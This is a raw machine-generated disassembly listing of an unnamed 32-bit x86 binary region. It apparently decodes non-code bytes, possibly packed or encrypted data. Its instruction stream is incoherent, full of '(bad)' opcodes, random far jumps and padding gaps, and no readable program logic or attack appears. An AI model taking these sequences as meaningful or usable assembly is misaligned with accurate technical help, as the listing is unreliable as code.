  42370c:	imul   ecx,DWORD PTR [eax],0x349b0a7a
  423712:	enter  0xbede,0x3f
  423716:	mov    gs,edi
  423718:	mov    ch,0xb8
  42371a:	loopne 0x4236fb
  42371c:	and    eax,0xb6649dd8
  423721:	pop    ds
  423722:	push   ecx
  423723:	xor    ecx,ecx
  423725:	push   esi
  423726:	stos   BYTE PTR es:[edi],al
  423727:	or     ecx,DWORD PTR [ebp+ecx*4-0x75fb1b36]
  42372e:	mov    ch,0xee
  423730:	cmp    dl,BYTE PTR [esi+0x74af51af]
  423736:	sub    ecx,DWORD PTR [edi+0x62]
  423739:	lods   al,BYTE PTR ds:[esi]
  42373a:	cmp    dl,ch
  42373c:	(bad)  [edx-0x17ff40b6]
  423742:	mov    esi,0x7f7dae57
  423747:	js     0x423735
  423749:	cmc    
  42374a:	and    ebx,0xffffffa0
  42374d:	xchg   esp,eax
  42374e:	std    
  42374f:	jg     0x423715
  423751:	scas   eax,DWORD PTR es:[edi]
  423752:	or     cl,0xbd
  423755:	mov    edi,0xf3e14ef5
  42375a:	popa   
  42375b:	xor    ecx,DWORD PTR [ecx+0x25ee9316]
  423761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423762:	scas   al,BYTE PTR es:[edi]
  423763:	dec    ebp
  423764:	adc    dl,ah
  423766:	lock mov edi,0xa443fca
  42376c:	push   cs
  42376d:	mov    ah,0x47
  42376f:	retf   0xb2bc
  423772:	mov    dl,0x48
  423774:	or     ebx,DWORD PTR [ebp-0x56]
  423777:	and    cl,BYTE PTR [eax+0x64842c97]
  42377d:	jae    0x423737
  42377f:	lds    edx,FWORD PTR [ebx+0x25]
  423782:	mov    edx,0x1c68007d
  423787:	arpl   cx,ax
  423789:	sbb    eax,0xf82d256a
  42378e:	jae    0x423720
  423790:	push   0x6b
  423792:	bound  edx,QWORD PTR [eax-0x26]
  423795:	call   0x6a88d36b
  42379a:	and    DWORD PTR [ebp-0x3b],0x19
  42379e:	lock mov cl,0xd0
  4237a1:	adc    bl,ch
  4237a3:	loop   0x423812
  4237a5:	dec    ebx
  4237a6:	jecxz  0x423808
  4237a8:	jmp    0x423818
  4237aa:	mov    bh,0x10
  4237ac:	dec    eax
  4237ad:	fcom   st(6)
  4237af:	mov    al,ds:0x928639c0
  4237b4:	cmp    DWORD PTR [edx-0x2638068b],0xa87e11c
  4237be:	jle    0x423749
  4237c0:	dec    edx
  4237c1:	inc    eax
  4237c2:	pop    ds
  4237c3:	mov    ebp,0xb68b83f8
  4237c8:	lods   eax,DWORD PTR ds:[esi]
  4237c9:	aas    
  4237ca:	cld    
  4237cb:	loope  0x4237a3
  4237cd:	sbb    al,0xab
  4237cf:	xchg   esi,eax
  4237d0:	cmp    BYTE PTR gs:[ecx-0x957fcbd],0x4
  4237d8:	fdivr  DWORD PTR [eax+ecx*4+0x1b]
  4237dd:	pop    ebp
  4237de:	push   eax
  4237df:	(bad)  
  4237e0:	xor    al,0x59
  4237e2:	pusha  
  4237e3:	(bad)  
  4237e4:	es (bad) 
  4237e6:	xlat   BYTE PTR ds:[ebx]
  4237e7:	and    edx,DWORD PTR [ecx+edx*1]
  4237ea:	sub    DWORD PTR [edx+0x267f],eax
	...
  423854:	add    BYTE PTR [eax],al
  423856:	xor    al,0x23
  423858:	jo     0x4237f7
  42385a:	ja     0x42383b
  42385c:	std    
  42385d:	stos   DWORD PTR es:[edi],eax
  42385e:	(bad)  
  42385f:	sbb    edx,esi
  423861:	jmp    0x7d67:0xcde7775f
  423868:	add    DWORD PTR [eax],eax
  42386a:	add    BYTE PTR [ecx],al
  42386c:	add    BYTE PTR [eax],al
  42386e:	add    dl,bh
  423870:	xor    bh,BYTE PTR [eax]
  423872:	mov    eax,0x97d63749
  423877:	mov    bh,0xf9
  423879:	scas   eax,DWORD PTR es:[edi]
  42387a:	push   ecx
  42387b:	push   0xffffff8f
  42387d:	rcr    DWORD PTR [eax],0xd4
  423880:	xor    bl,BYTE PTR [edx-0x3b]
  423883:	aas    
  423884:	add    DWORD PTR [ecx-0x1f],0x11e4bfb4
  42388b:	pop    esi
  42388c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42388d:	pop    ebp
  42388e:	ja     0x4238ef
  423890:	(bad)  
  423892:	aam    0xe1
  423894:	mov    ch,0x6d
  423896:	test   bh,al
  423898:	(bad)  
  423899:	out    0xd3,al
  42389b:	xchg   ebp,eax
  42389c:	mov    dl,0x36
  42389e:	push   edi
  42389f:	fdivr  DWORD PTR [edi]
  4238a1:	sub    eax,0xcc499b00
  4238a6:	mov    edx,0x4a98cc5d
  4238ab:	add    eax,0xe3ce348f
  4238b0:	(bad)  
  4238b1:	retf   0x12db
  4238b4:	sbb    dl,BYTE PTR [edi+0x28732563]
  4238ba:	imul   ebp,DWORD PTR ds:0x2ae48d0,0x9e506d04
  4238c4:	das    
  4238c5:	(bad)  
  4238c6:	out    0xce,eax
  4238c8:	leave  
  4238c9:	or     BYTE PTR [ecx+0x33],0xa7
  4238cd:	jge    0x423902
  4238cf:	xchg   bh,bl
  4238d1:	inc    ebp
  4238d2:	in     al,0x74
  4238d4:	sub    eax,0xccde9b68
  4238d9:	inc    ebx
  4238da:	pop    ds
  4238db:	call   0x5447:0x30e72559
  4238e2:	xchg   ebp,eax
  4238e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238e4:	cmp    DWORD PTR [edx+0x6536552b],0xffffff90
  4238eb:	rcr    BYTE PTR [ecx],cl
  4238ed:	and    ecx,DWORD PTR [ebx-0x46c3f48]
  4238f3:	adc    DWORD PTR [eax+0x6fc336ec],0x76216747
  4238fd:	mov    edi,0xf56f8190
  423902:	stc    
  423903:	gs test ebp,esp
  423906:	fcmovu st,st(2)
  423908:	test   ebx,esp
  42390a:	jb     0x4238d4
  42390c:	mov    dl,0x54
  42390e:	inc    esp
  42390f:	icebp  
  423910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423911:	xchg   ebx,eax
  423912:	dec    ebp
  423913:	cmp    eax,ebx
  423915:	and    bh,BYTE PTR [ebx+0x62c88a93]
  42391b:	fcmovnu st,st(4)
  42391d:	sbb    ah,BYTE PTR [esi-0x69b0a331]
  423923:	daa    
  423924:	retf   0x973
  423927:	ficomp WORD PTR [eax-0x6e]
  42392a:	xor    al,0xe6
  42392c:	inc    ebx
  42392d:	xchg   esi,eax
  42392e:	aas    
  42392f:	jo     0x423948
  423931:	add    eax,0xffffffe7
  423934:	enter  0x2019,0x57
  423938:	popf   
  423939:	out    dx,al
  42393a:	pop    es
  42393b:	cmp    edx,DWORD PTR [edi+0x1b]
  42393e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42393f:	test   eax,0x30bd473e
  423944:	std    
  423945:	mov    ch,ch
  423947:	sar    al,1
  423949:	dec    eax
  42394a:	fild   WORD PTR [ecx-0x25]
  42394d:	iret   
  42394e:	rcl    BYTE PTR [ecx+0x602f1477],1
  423954:	xchg   ecx,eax
  423955:	mov    al,ds:0xc09146e8
  42395a:	mov    al,dl
  42395c:	aaa    
  42395d:	iret   
  42395e:	or     al,dh
  423960:	mov    ebx,0x712b1f00
  423965:	xchg   esp,eax
  423966:	jge    0x423940
  423968:	hlt    
  423969:	es cmp eax,0xaa1ef0
	...
  4239d3:	add    BYTE PTR [eax],al
  4239d5:	add    BYTE PTR [edx-0x770e5c],cl
  4239db:	(bad)  
  4239dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239de:	push   ecx
  4239df:	sbb    eax,0xe5532bbd
  4239e4:	test   BYTE PTR [ebp+0x67],dl
  4239e7:	jle    0x4239ea
  4239e9:	add    BYTE PTR [eax],al
  4239eb:	add    DWORD PTR [eax],eax
  4239ed:	add    BYTE PTR ds:0xb2f86d85,cl
  4239f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239f4:	xor    dl,BYTE PTR [edi+0x8]
  4239f7:	xor    eax,0x6594d8f0
  4239fc:	mov    BYTE PTR [ebp-0x30],ah
  4239ff:	sbb    DWORD PTR [ecx],0xf2afd23a
  423a05:	sti    
  423a06:	mov    ds:0xe86748b3,eax
  423a0b:	inc    ebx
  423a0c:	ss inc esi
  423a0e:	cmp    BYTE PTR ss:[ebx+eax*4-0x63],cl
  423a13:	push   es
  423a14:	fmul   DWORD PTR [eax+eax*1-0x4f02ef93]
  423a1b:	cmp    ecx,DWORD PTR [ecx-0x42]
  423a1e:	push   es
  423a1f:	or     cl,BYTE PTR [edi+eiz*2+0x73f14536]
  423a26:	repnz and DWORD PTR [esi-0xbe0f95b],0x1a8551fc
  423a31:	cmp    BYTE PTR [eax+ecx*4+0x6d4e601e],bl
  423a38:	adc    al,0xdf
  423a3a:	aas    
  423a3b:	cli    
  423a3c:	(bad)  
  423a3d:	shr    DWORD PTR [edi+ebx*2],cl
  423a40:	rcr    DWORD PTR [eax-0x28e17c66],1
  423a46:	adc    esi,0xf539f445
  423a4c:	(bad)  [ebp-0xa]
  423a4f:	repz test eax,0xe98d018a
  423a55:	test   DWORD PTR [edx],esp
  423a57:	jne    0x4239dc
  423a59:	out    dx,eax
  423a5a:	xchg   edi,eax
  423a5b:	xor    DWORD PTR [eax-0x80],0xe1f8285
  423a62:	retf   
  423a63:	test   edi,esp
  423a65:	(bad)  
  423a66:	fdivr  DWORD PTR [esi]
  423a68:	mov    esp,esp
  423a6a:	(bad)  
  423a6b:	xor    BYTE PTR [eax+0x75],al
  423a6e:	pop    es
  423a6f:	pop    eax
  423a70:	call   0x2a79a1e1
  423a75:	into   
  423a76:	lods   al,BYTE PTR ds:[esi]
  423a77:	xchg   edx,eax
  423a78:	adc    esi,DWORD PTR es:0xdf3ccfa0
  423a7f:	(bad)  
  423a81:	xchg   edx,eax
  423a82:	sbb    al,bl
  423a84:	sub    al,0xca
  423a86:	inc    edx
  423a87:	mov    edx,0xc8b8f95b
  423a8c:	cmp    ch,BYTE PTR [ebx+0x36]
  423a8f:	iret   
  423a90:	push   ebx
  423a91:	sti    
  423a92:	xchg   ecx,eax
  423a93:	cli    
  423a94:	pop    esi
  423a95:	jbe    0x423aa1
  423a97:	dec    edx
  423a98:	call   0x977bd8be
  423a9d:	inc    ebx
  423a9e:	test   eax,0x4e3643fc
  423aa3:	add    ah,ch
  423aa5:	outs   dx,BYTE PTR ds:[esi]
  423aa7:	inc    eax
  423aa8:	inc    BYTE PTR [edx+0x5d]
  423aab:	aad    0x32
  423aad:	div    DWORD PTR ds:0x57a88a77
  423ab3:	mov    dl,dh
  423ab5:	cmc    
  423ab6:	repz out dx,al
  423ab8:	mov    BYTE PTR [ebx],cl
  423aba:	imul   edi,DWORD PTR [eax],0xe13318bf
  423ac0:	arpl   WORD PTR [eax-0x13],dx
  423ac3:	sbb    eax,0x18fa31cf
  423ac8:	fcom   QWORD PTR ss:[edi]
  423acb:	push   cs
  423acc:	cli    
  423acd:	cmc    
  423ace:	ins    DWORD PTR es:[edi],dx
  423acf:	leave  
  423ad0:	mov    bh,0xf4
  423ad2:	mov    al,ds:0x3d1160f
  423ad7:	enter  0xb34b,0x9
  423adb:	imul   ecx,DWORD PTR [ecx],0xe78b27e5
  423ae1:	sti    
  423ae2:	retf   0x63b
  423ae5:	xor    DWORD PTR [edi],0xffffffad
  423ae8:	(bad)  
  423aea:	ja     0x423b2a
  423aec:	mov    ebp,0xe8
	...
  423b55:	add    BYTE PTR [eax],dh
  423b57:	cmp    eax,0xdf7d9f75
  423b5c:	cli    
  423b5d:	mov    edi,0x60851ed8
  423b62:	scas   eax,DWORD PTR es:[edi]
  423b63:	cmc    
  423b64:	and    BYTE PTR [edi+eiz*2+0x7f],cl
  423b68:	add    DWORD PTR [eax],eax
  423b6a:	add    BYTE PTR [ecx],al
  423b6c:	add    BYTE PTR [eax],al
  423b6e:	pop    ebp
  423b6f:	jle    0x423b84
  423b71:	ficomp WORD PTR ds:0x38a6b97c
  423b77:	mov    ah,0x66
  423b79:	mov    dh,0x38
  423b7b:	fdiv   DWORD PTR [esi-0x28]
  423b7e:	sbb    al,0xbb
  423b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b81:	mov    edi,0xa1a3820f
  423b86:	jo     0x423b66
  423b88:	and    BYTE PTR [ebx-0x63],0x1d
  423b8c:	leave  
  423b8d:	sahf   
  423b8e:	xor    al,0x6b
  423b90:	adc    eax,DWORD PTR [edi+0x76]
  423b93:	test   cl,bl
  423b95:	pop    ss
  423b96:	and    ecx,DWORD PTR [edx-0x9a8a26e]
  423b9c:	pusha  
  423b9d:	pusha  
  423b9e:	inc    ebx
  423b9f:	dec    eax
  423ba0:	scas   al,BYTE PTR es:[edi]
  423ba1:	call   0x996adec0
  423ba6:	push   edx
  423ba7:	fwait
  423ba8:	enter  0xd8fe,0xa0
  423bac:	in     eax,0x86
  423bae:	dec    edx
  423baf:	sub    BYTE PTR [eiz*2-0x378dd8a4],0xf4
  423bb7:	pop    ss
  423bb8:	pop    edi
  423bb9:	out    0x13,al
  423bbb:	loopne 0x423b98
  423bbd:	scas   eax,DWORD PTR es:[edi]
  423bbe:	(bad)  
  423bbf:	pop    ebx
  423bc0:	pop    esi
  423bc1:	lods   al,BYTE PTR ds:[esi]
  423bc2:	push   0x8ae4b070
  423bc7:	in     al,dx
  423bc8:	iret   
  423bc9:	push   es
  423bca:	dec    ebx
  423bcb:	push   edx
  423bcc:	fld    DWORD PTR [ecx-0x32]
  423bcf:	cli    
  423bd0:	dec    edx
  423bd1:	mov    BYTE PTR [ebx+ecx*4-0x20],bh
  423bd5:	jne    0x423c29
  423bd7:	cmc    
  423bd8:	mov    bh,0xd8
  423bda:	outs   dx,BYTE PTR ds:[esi]
  423bdb:	or     DWORD PTR [edi-0x5c],ebx
  423bde:	jb     0x423bec
  423be0:	mul    BYTE PTR [ecx+0x1c84ccbc]
  423be6:	sbb    ecx,eax
  423be8:	push   DWORD PTR [ebp+0x55]
  423beb:	xchg   edi,eax
  423bec:	inc    esp
  423bed:	push   eax
  423bee:	sub    al,0xa6
  423bf0:	pop    ds
  423bf1:	sbb    eax,0x86be95df
  423bf6:	ss adc eax,0x3dd7f679
  423bfc:	inc    edx
  423bfd:	mov    ebx,DWORD PTR [edi+0x1a3e7f49]
  423c03:	clc    
  423c04:	fisttp DWORD PTR [ebx+ebp*1]
  423c07:	or     BYTE PTR [edi+ecx*2+0x622ea40e],al
  423c0e:	dec    ebx
  423c0f:	(bad)  
  423c11:	ins    BYTE PTR es:[edi],dx
  423c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c13:	cmc    
  423c14:	gs pop edi
  423c16:	out    dx,al
  423c17:	inc    esp
  423c18:	(bad)  
  423c1a:	mov    eax,ds:0x99db983b
  423c1f:	sub    DWORD PTR [ebp+eiz*8+0x61059114],esi
  423c26:	xchg   edx,eax
  423c27:	mov    dl,0xaf
  423c29:	fsub   QWORD PTR [eax-0x4a]
  423c2c:	inc    edx
  423c2d:	or     eax,0x87765f82
  423c32:	jge    0x423bf8
  423c34:	mov    ebp,0x82e688d0
  423c39:	dec    ebp
  423c3a:	jmp    0x5047:0xfdd61d15
  423c41:	or     eax,0x4fe7e9e9
  423c46:	mov    al,0xe1
  423c48:	push   0x63
  423c4a:	cdq    
  423c4b:	and    eax,0x8e57073d
  423c50:	cmp    ch,BYTE PTR [ecx-0x48]
  423c53:	xchg   esi,eax
  423c54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c55:	push   es
  423c56:	inc    esp
  423c57:	jge    0x423c62
  423c59:	sub    edx,ecx
  423c5b:	jmp    0xada80086
  423c60:	loop   0x423c89
  423c62:	int3   
  423c63:	sbb    eax,0xf6c3f948
  423c68:	or     dh,ah
  423c6a:	scas   al,BYTE PTR es:[edi]
  423c6b:	push   0xffffffd2
  423c6d:	xchg   ebp,eax
	...
  423cd6:	std    
  423cd7:	(bad)  
  423cd8:	test   eax,0xff57ab46
  423cdd:	call   FWORD PTR [eax+0x34446617]
  423ce3:	scas   eax,DWORD PTR es:[edi]
  423ce4:	push   ebp
  423ce5:	add    BYTE PTR ds:[bx+di],0x0
  423cea:	add    BYTE PTR [ecx],al
  423cec:	add    BYTE PTR [eax],al
  423cee:	xchg   esi,eax
  423cef:	mov    ah,0x17
  423cf1:	test   BYTE PTR [edi+0x6ad8b1e1],bh
  423cf7:	xchg   ebp,eax
  423cf8:	sbb    al,0x9
  423cfa:	rol    DWORD PTR [edx],1
  423cfc:	pop    edx
  423cfd:	jp     0x423d5c
  423cff:	loope  0x423c82
  423d01:	xor    DWORD PTR [ebp+0x46],eax
  423d04:	push   es
  423d05:	mov    BYTE PTR [edx+0x37e6600f],bl
  423d0b:	xchg   edi,ecx
  423d0d:	pop    esp
  423d0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d0f:	mov    dl,BYTE PTR [edx]
  423d11:	ret    0xa135
  423d14:	pushf  
  423d15:	mov    ah,0xae
  423d17:	push   ebp
  423d18:	call   0xb142272e
  423d1d:	sbb    ecx,DWORD PTR [ebp-0x48796c]
  423d23:	xchg   ebp,eax
  423d24:	jae    0x423da0
  423d26:	mov    ds:0x6682ed7d,eax
  423d2b:	dec    ecx
  423d2c:	push   ss
  423d2d:	mov    eax,0xdeb2d75a
  423d32:	test   DWORD PTR [edx+eax*4],esi
  423d35:	sub    esi,DWORD PTR [edx]
  423d37:	(bad)  [ecx]
  423d39:	jb     0x423d9f
  423d3b:	je     0x423ced
  423d3d:	or     eax,0x5bad4826
  423d42:	popf   
  423d43:	stos   DWORD PTR es:[edi],eax
  423d44:	fistp  DWORD PTR [ebx]
  423d46:	pop    edi
  423d47:	jle    0x423d50
  423d49:	adc    bl,ah
  423d4b:	rcr    DWORD PTR [edi-0x10e4a47e],0x96
  423d52:	jno    0x423d72
  423d54:	js     0x423cef
  423d56:	mov    esi,0x73631ee1
  423d5b:	xor    ebx,0xe59419fd
  423d61:	test   BYTE PTR [edx],bh
  423d63:	arpl   WORD PTR [ecx-0x76a42040],sp
  423d69:	cmp    al,0xca
  423d6b:	cmp    eax,0x61d281f
  423d70:	loopne 0x423da6
  423d72:	xor    esp,DWORD PTR [bp+di-0x33]
  423d76:	mov    dh,0xda
  423d78:	inc    ebp
  423d79:	cwde   
  423d7a:	into   
  423d7b:	fild   QWORD PTR ds:0xce6b4cf3
  423d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d82:	sar    DWORD PTR [ebx-0x24],1
  423d85:	mov    al,0x29
  423d87:	sub    al,0x64
  423d89:	ret    
  423d8a:	add    ebx,eax
  423d8c:	sub    eax,esp
  423d8e:	xor    eax,0xa0a8e8b2
  423d93:	mov    esp,ecx
  423d95:	cmp    eax,0x281a4361
  423d9a:	sub    BYTE PTR [ebx-0x348ebd6f],bh
  423da0:	and    BYTE PTR [eax+0x2c848a00],ah
  423da6:	adc    ebp,DWORD PTR [eax-0x12]
  423da9:	outs   dx,DWORD PTR ds:[esi]
  423daa:	popf   
  423dab:	in     al,dx
  423dac:	push   ebx
  423dad:	mov    dh,0x3e
  423daf:	and    ch,BYTE PTR [eax-0xc441e3d]
  423db5:	cmp    al,0xd7
  423db7:	jge    0x423d9c
  423db9:	adc    eax,0xeb0c56aa
  423dbe:	repz mov ds:0xfa0606b8,eax
  423dc4:	xchg   ebp,eax
  423dc5:	inc    edi
  423dc6:	rcr    BYTE PTR [ecx],cl
  423dc8:	or     BYTE PTR ds:0x8f0e5cae,0xbb
  423dcf:	lea    ebx,[edi]
  423dd1:	ffreep st(0)
  423dd3:	dec    ebx
  423dd4:	xor    DWORD PTR [ebp+ebx*4-0xb],0xffffffcc
  423dd9:	pop    ecx
  423dda:	out    0xd,al
  423ddc:	jbe    0x423e0b
  423dde:	xchg   eax,esp
  423de0:	mov    dl,0xb6
  423de2:	pop    edi
  423de3:	sub    ebp,0x2e
  423de6:	test   eax,0xcb3beb6
  423deb:	iret   
  423dec:	shl    BYTE PTR [edx],0x0
	...
  423e53:	add    BYTE PTR [eax],al
  423e55:	add    BYTE PTR [edx-0xa],ah
  423e58:	xchg   DWORD PTR [ecx],ecx
  423e5a:	xchg   edi,eax
  423e5b:	jns    0x423e4b
  423e5d:	jmp    DWORD PTR [edi]
  423e5f:	mov    DWORD PTR [eax-0x684af12e],esp
  423e65:	add    DWORD PTR ds:[bx+di],0x10000
  423e6d:	add    cl,cl
  423e6f:	das    
  423e70:	test   eax,0xc4475d3d
  423e75:	xchg   ebx,eax
  423e76:	stos   DWORD PTR es:[edi],eax
  423e77:	cmp    ecx,DWORD PTR [ecx-0x55]
  423e7a:	fisttp WORD PTR [esi+0x55]
  423e7d:	cdq    
  423e7e:	push   edx
  423e7f:	or     bl,BYTE PTR [esi+ecx*4+0x6f19e1ff]
  423e86:	ds icebp 
  423e88:	ss push ebx
  423e8a:	push   ecx
  423e8b:	(bad)  
  423e8c:	adc    al,0xa3
  423e8e:	daa    
  423e8f:	pusha  
  423e90:	aaa    
  423e91:	icebp  
  423e92:	and    BYTE PTR [edx-0x6a54bdc1],al
  423e98:	test   BYTE PTR [ecx],bl
  423e9a:	das    
  423e9b:	(bad)  
  423e9c:	(bad)  
  423e9e:	dec    ebx
  423e9f:	xor    edi,DWORD PTR [edx]
  423ea1:	in     al,0x5e
  423ea3:	jge    0x423ed2
  423ea5:	push   0x9719b9a0
  423eaa:	lods   eax,DWORD PTR ds:[esi]
  423eab:	add    eax,0xcffb08e5
  423eb0:	mov    al,ds:0xab406dab
  423eb5:	xchg   esi,eax
  423eb6:	test   al,0x7c
  423eb8:	pushf  
  423eb9:	push   cs
  423eba:	or     ecx,DWORD PTR fs:[ebx-0x7397de58]
  423ec1:	jmp    0x423f29
  423ec3:	int3   
  423ec4:	int3   
  423ec5:	xchg   ebx,eax
  423ec6:	sbb    edx,DWORD PTR [esi]
  423ec8:	fs ins DWORD PTR es:[edi],dx
  423eca:	pop    esp
  423ecb:	or     al,0xd0
  423ecd:	xchg   DWORD PTR [esi-0x6c],ecx
  423ed0:	imul   esp,esi,0x22
  423ed3:	sets   BYTE PTR [edx-0x56]
  423ed7:	in     al,dx
  423ed8:	xlat   BYTE PTR ds:[ebx]
  423ed9:	fist   DWORD PTR [ebp+0x1f234ec1]
  423edf:	sub    dl,dl
  423ee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ee2:	mov    edi,0xa314e298
  423ee7:	icebp  
  423ee8:	add    DWORD PTR [esi-0x357e52f4],esi
  423eee:	stos   BYTE PTR es:[edi],al
  423eef:	enter  0xa81b,0x25
  423ef3:	adc    ch,BYTE PTR [ebx+ebp*2]
  423ef6:	mov    ds:0x9d71bfce,eax
  423efb:	jmp    0x423efd
  423efd:	push   ds
  423efe:	cs ins DWORD PTR es:[edi],dx
  423f00:	(bad)  
  423f01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f02:	popa   
  423f03:	cs daa 
  423f05:	or     cl,BYTE PTR [ecx]
  423f07:	push   0xb1558978
  423f0c:	fld    QWORD PTR [esi+0x3d]
  423f0f:	cmp    DWORD PTR [edi*1+0x5e8579ac],edi
  423f16:	add    eax,0x7d5efc1a
  423f1b:	loopne 0x423f1a
  423f1d:	mov    ch,BYTE PTR [eax+0x2e]
  423f20:	test   DWORD PTR [esi],eax
  423f22:	lock jp 0x423f89
  423f25:	mov    al,ds:0x364437d9
  423f2a:	scas   al,BYTE PTR es:[edi]
  423f2b:	popa   
  423f2c:	or     cl,BYTE PTR [ecx+eax*1-0x5e96775b]
  423f33:	fs mov eax,es:0xe485588
  423f3a:	ins    DWORD PTR es:[edi],dx
  423f3b:	and    esi,DWORD PTR fs:[esi-0x55]
  423f3f:	lahf   
  423f40:	inc    esi
  423f41:	ftst   
  423f43:	cwde   
  423f44:	(bad)
  423f48:	add    cl,dh
  423f4a:	stos   DWORD PTR es:[edi],eax
  423f4b:	shr    DWORD PTR [ecx],1
  423f4d:	xlat   BYTE PTR ds:[ebx]
  423f4e:	retf   0x4d68
  423f51:	push   ecx
  423f52:	adc    bh,cl
  423f54:	stos   BYTE PTR es:[edi],al
  423f55:	into   
  423f56:	test   eax,0x26be5e81
  423f5b:	and    BYTE PTR [esi],al
  423f5d:	adc    ax,WORD PTR [ecx-0x77]
  423f61:	(bad)  
  423f62:	sar    esi,1
  423f64:	(bad)  ds:0x299f787
  423f6a:	imul   ebp,DWORD PTR [ebp+0x2f],0xffffffab
	...
  423fd6:	scas   al,BYTE PTR es:[edi]
  423fd7:	call   0x9fff:0xff74b964
  423fde:	adc    al,0x96
  423fe0:	sbb    al,0xd9
  423fe2:	sbb    al,BYTE PTR [esi]
  423fe4:	fisttp QWORD PTR [edi]
  423fe6:	add    BYTE PTR [bx+di],0x0
  423fea:	add    BYTE PTR [ecx],al
  423fec:	add    BYTE PTR [eax],al
  423fee:	xchg   DWORD PTR [esi+0x65],eax
  423ff1:	pop    edx
  423ff2:	hlt    
  423ff3:	pop    ss
  423ff4:	lods   eax,DWORD PTR ds:[esi]
  423ff5:	xchg   ebp,eax
  423ff6:	push   0xffffff87
  423ff8:	pop    edx
  423ff9:	sub    DWORD PTR [esi],esi
  423ffb:	cwde   
  423ffc:	push   edi
  423ffd:	inc    edi
  423ffe:	test   cl,bl
  424000:	pop    es
  424001:	cmc    
  424002:	cli    
  424003:	arpl   sp,ax
  424005:	jno    0x423fba
  424007:	iret   
  424008:	dec    esi
  424009:	out    0xf3,eax
  42400b:	retf   0x6e17
  42400e:	fild   QWORD PTR [edi]
  424010:	cmp    bh,BYTE PTR [ebx+ebx*8]
  424013:	nop
  424014:	sahf   
  424015:	mov    ebp,0xfbce8160
  42401a:	push   esi
  42401b:	pop    ebx
  42401c:	jnp    0x42403b
  42401e:	push   edi
  42401f:	test   al,0x31
  424021:	popf   
  424022:	cmp    BYTE PTR [ebp*2+0x370644ae],dh
  424029:	inc    esp
  42402a:	dec    eax
  42402b:	xor    bh,BYTE PTR [ebp-0x124bb172]
  424031:	push   ds
  424032:	xor    DWORD PTR [bp+di-0x3b],eax
  424036:	push   cs
  424037:	loop   0x423ff8
  424039:	mov    esi,0x3fce5b31
  42403e:	add    edi,DWORD PTR [esi-0x534f0e60]
  424044:	leave  
  424045:	push   0xf
  424047:	and    al,0xfa
  424049:	sbb    eax,0x111f2de5
  42404e:	mov    esi,0x168583e7
  424053:	ret    
  424054:	cs in  eax,0x2b
  424057:	sbb    BYTE PTR [ebx],dl
  424059:	sbb    BYTE PTR [ecx-0x66],0x80
  42405d:	sub    DWORD PTR [ecx+edx*8-0x69],0x30
  424062:	add    dl,BYTE PTR gs:[edx]
  424065:	adc    al,0x1d
  424067:	push   edi
  424068:	call   0x65f8:0x7f84837
  42406f:	call   0x62f48a07
  424074:	(bad)  
  424075:	dec    esi
  424076:	and    DWORD PTR [ebx+0x2f],edi
  424079:	add    al,0x84
  42407b:	xchg   cl,ah
  42407d:	cmp    DWORD PTR [ebp+ebp*2-0x51],ecx
  424081:	dec    esi
  424082:	sub    al,0x89
  424084:	(bad)  
  424085:	adc    ebx,DWORD PTR [bp+di+0x578d]
  42408a:	loop   0x42401d
  42408c:	dec    ecx
  42408d:	clc    
  42408e:	jle    0x424016
  424090:	ja     0x42401e
  424092:	imul   esi,DWORD PTR [ebx-0x232bc966],0x2b6b30a6
  42409c:	sbb    DWORD PTR [esi],0x58
  42409f:	inc    edx
  4240a0:	retf   
  4240a1:	in     al,dx
  4240a2:	push   ebx
  4240a3:	mov    bl,0xa
  4240a5:	inc    eax
  4240a6:	out    dx,al
  4240a7:	xchg   esp,eax
  4240a8:	and    esp,DWORD PTR [ecx+ebx*2]
  4240ab:	lds    ecx,FWORD PTR [edi-0x28]
  4240ae:	cmc    
  4240af:	push   ss
  4240b0:	aam    0x6c
  4240b2:	loop   0x424111
  4240b4:	mov    bh,0x8e
  4240b7:	sub    esi,0x58
  4240ba:	jge    0x42409e
  4240bc:	sahf   
  4240bd:	cld    
  4240be:	aam    0x1c
  4240c0:	out    dx,al
  4240c1:	loopne 0x424120
  4240c3:	sub    edi,DWORD PTR [esi-0x19d30447]
  4240c9:	aaa    
  4240ca:	inc    eax
  4240cb:	push   ebx
  4240cc:	jmp    0x4240ed
  4240ce:	int    0xfd
  4240d0:	push   es
  4240d1:	or     dh,al
  4240d3:	loop   0x42410b
  4240d5:	and    eax,0x275ded8d
  4240da:	mov    DWORD PTR [edi+ebx*1+0x35],ebp
  4240de:	lahf   
  4240df:	fldenv [ecx+0x46]
  4240e2:	mov    ds:0x4988f733,al
  4240e7:	adc    bh,0x44
  4240ea:	das    
  4240eb:	xor    DWORD PTR [esi+ebx*1+0x0],ebx
	...
  424156:	jl     0x4241b0
  424158:	cs mov cl,0x2e
  42415b:	idiv   edi
  42415d:	(bad)  
  42415f:	jne    0x424128
  424161:	iret   
  424162:	imul   eax,DWORD PTR [eax],0x1a
  424165:	add    DWORD PTR fs:[bx+di],0x0
  42416a:	add    BYTE PTR [ecx],al
  42416c:	add    BYTE PTR [eax],al
  42416e:	(bad)
  424171:	out    0x35,eax
  424173:	test   ebx,ebp
  424175:	gs mov esp,0x4dc25bf7
  42417b:	ret    
  42417c:	ror    BYTE PTR [ebx-0x56cd094c],cl
  424182:	xchg   DWORD PTR [edi],esp
  424184:	cs push esp
  424186:	xchg   DWORD PTR [esi],esi
  424188:	lods   al,BYTE PTR ds:[esi]
  424189:	fist   DWORD PTR [edi-0x3e]
  42418c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42418d:	ret    0x6c9
  424190:	pop    ecx
  424191:	add    eax,0x4a217c61
  424196:	mov    eax,ds:0xd1166f25
  42419b:	loopne 0x4241cb
